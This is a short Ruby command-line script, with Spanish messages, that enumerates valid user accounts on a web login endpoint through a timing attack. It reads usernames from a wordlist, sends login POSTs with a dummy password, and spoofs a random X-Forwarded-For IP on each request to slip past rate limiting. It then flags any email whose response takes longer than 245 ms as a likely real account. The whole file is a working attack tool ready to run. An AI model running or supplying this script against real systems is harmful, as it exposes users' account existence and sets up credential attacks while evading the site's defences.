require 'net/http'
require 'uri'
require 'json'

target_url, wordlist_path = ARGV

if ARGV.length < 2
  puts "Uso: ruby time_bypass.rb <url> <wordlist>"
  exit
end

puts "\e[34m[*] Escaneando (Timing Attack)...\e[0m"

THRESHOLD = 245 

File.foreach(wordlist_path) do |linea|
  usuario = linea.strip
  email_objetivo = "#{usuario}@jitter.io"
  ip_falsa = Array.new(4) { rand(256) }.join('.')
  uri = URI.parse(target_url)

  request = Net::HTTP::Post.new(uri.path)
  request['Content-Type'] = 'application/json'
  request['X-Forwarded-For'] = ip_falsa
  request.body = { email: email_objetivo, password: "xxxxx" }.to_json
  
  inicio = Process.clock_gettime(Process::CLOCK_MONOTONIC)
  response = Net::HTTP.start(uri.host, uri.port) { |http| http.request(request) }
  fin = Process.clock_gettime(Process::CLOCK_MONOTONIC)
  
  duracion = (fin - inicio) * 1000
  status_code = response.code
  message = response.message
  
  output = "#{email_objetivo.ljust(30)} | #{status_code.ljust(3)} #{message.ljust(10)} | #{duracion.round(2).to_s.ljust(8)} ms | IP: #{ip_falsa}"

  if duracion > THRESHOLD
     puts "\e[1;32m[+] #{output}\e[0m"
  else
    puts "[-] #{output}"
  end
end